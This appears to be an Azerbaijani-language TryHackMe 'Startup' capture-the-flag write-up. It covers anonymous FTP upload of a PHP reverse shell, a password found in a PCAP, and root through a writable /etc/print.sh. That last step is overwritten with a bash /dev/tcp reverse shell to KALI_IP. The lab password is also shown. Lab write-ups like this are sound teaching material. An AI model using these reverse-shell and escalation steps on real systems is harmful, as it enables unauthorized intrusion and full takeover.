# 🚀 TryHackMe — Startup Writeup

**Platforma:** TryHackMe  
**Room:** [Startup](https://tryhackme.com/room/startup)  
**Çətinlik:** Easy  
**OS:** Linux  
**Mövzu:** FTP Anonymous + PHP Reverse Shell + PCAP Analiz + Script PrivEsc  

---

## 📋 Xülasə

Bu room-da FTP anonymous girişi ilə PHP reverse shell yükləyirik, PCAP faylını analiz edərək parol tapırıq və `/etc/print.sh` skripti vasitəsilə root əldə edirik.

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan

```bash
nmap -sV -sC -p- 10.10.X.X
```

**Nəticə:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

---

## 📁 2. FTP — Anonymous Giriş

```bash
ftp 10.10.X.X
# Username: anonymous
# Password: (boş)
```

```bash
ftp> ls -la
```

```
drwxrwxrwx  2 65534  65534  4096 ftp
-rw-r--r--  1 0      0       136 notice.txt
-rw-r--r--  1 0      0       220 important.jpg
```

**notice.txt məzmunu:**
```
Whoever is leaving these damn Among Us memes in this share, 
it IS NOT FUNNY. Maya is looking pretty sus.
```

> 💡 **Maya** — username ipucu!

---

## 🌐 3. Web Kəşfiyyatı

### Gobuster

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
```

```
/files    (Status: 301)
/index.html (Status: 200)
```

> 💡 `/files` — FTP qovluğunun veb üzərindən görünən yeridir!

---

## 🐚 4. PHP Reverse Shell

### Shell hazırla:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
# $ip = 'KALI_IP';
# $port = 4444;
```

### FTP ilə yüklə:

```bash
ftp 10.10.X.X
ftp> put shell.php
```

### Listener qur:

```bash
nc -lvnp 4444
```

### Shell-i aktivləşdir:

```
http://10.10.X.X/files/shell.php
```

```bash
# Shell stabilləşdir
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

> ✅ **www-data** shell alındı!

---

## 🏁 5. Recipe Flag

```bash
cat /recipe.txt
```

```
Someone asked what our main ingredient to our spice soup is today. 
I figured I can't keep it a secret forever and told him it was love.
```

> 🏁 **Recipe flag: love**

---

## 🔬 6. PCAP Analizi

```bash
ls /incidents/
# suspicious.pcapng
```

Kali-yə yüklə:

```bash
# Hədəf maşında
cd /incidents && python3 -m http.server 8888

# Kali-də
wget http://10.10.X.X:8888/suspicious.pcapng
```

### Wireshark ilə analiz:

```bash
wireshark suspicious.pcapng
```

**TCP Stream 2-də tapılanlar:**

```
$ sudo -l
[sudo] password for www-data:
c4ntg3t3n0ughsp1c3
```

> 💡 **Parol tapıldı: `c4ntg3t3n0ughsp1c3`**

PCAP-da həmçinin görünür:
- Hücumçunun IP-si: `192.168.22.139`
- Hədəfin IP-si: `192.168.33.10`
- Shell yolu: `/files/ftp/shell.php`
- Reverse shell portu: `4444`

---

## 💻 7. SSH — Lennie

```bash
ssh lennie@10.10.X.X
# Parol: c4ntg3t3n0ughsp1c3
```

### User Flag:

```bash
cat /home/lennie/user.txt
```

> 🏁 **User Flag əldə edildi!**

### Lennie-nin faylları:

```bash
ls /home/lennie/
# Documents  scripts  user.txt

cat /home/lennie/scripts/planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

---

## ⚡ 8. Privilege Escalation — /etc/print.sh

### İcazələri yoxla:

```bash
ls -la /etc/print.sh
```

```
-rwx------ 1 lennie lennie 25 Nov 12 2020 /etc/print.sh
```

> 💡 `lennie` sahibidir — yazıla bilər!

### Exploit:

**Kali-də listener:**
```bash
nc -lvnp 5555
```

**Hədəf maşında:**
```bash
echo '#!/bin/bash' > /etc/print.sh
echo 'bash -i >& /dev/tcp/KALI_IP/5555 0>&1' >> /etc/print.sh
sudo /home/lennie/scripts/planner.sh
```

```
# whoami
root
```

> ✅ Root oldug!

---

## 🏆 9. Root Flag

```bash
cat /root/root.txt
```

> 🏁 **Root Flag əldə edildi!**

---

## 📊 Xülasə Cədvəli

| Mərhələ | Alət | Nəticə |
|---|---|---|
| Port Scan | Nmap | FTP, SSH, HTTP |
| FTP | anonymous | notice.txt, important.jpg |
| Dir Scan | Gobuster | /files tapıldı |
| Shell Yükləmə | FTP + PHP shell | www-data shell |
| Recipe Flag | cat /recipe.txt | love |
| PCAP Analiz | Wireshark | c4ntg3t3n0ughsp1c3 parolu |
| SSH | lennie | User flag |
| PrivEsc | /etc/print.sh | Root shell |
| Root Flag | cat | root.txt |

---

## 🛠️ İstifadə Edilən Alətlər

- `nmap` — port kəşfiyyatı
- `ftp` — anonymous giriş + shell yükləmə
- `gobuster` — directory bruteforce
- `netcat` — reverse shell listener
- `wireshark/tshark` — PCAP analizi
- `ssh` — lennie girişi

---

## 📚 Öyrənilənlər

1. **FTP anonymous** + veb server birlikdə — RCE üçün ideal!
2. **PCAP analizi** — network trafikdə parollar açıq ola bilər
3. **Cron job / script** PrivEsc — script root ilə işləyirsə, onun çağırdığı fayla yaz!
4. `/etc/` faylları həmişə root-a məxsus deyil — icazələri yoxla!

---

*Writeup hazırlandı — TryHackMe Startup Room*
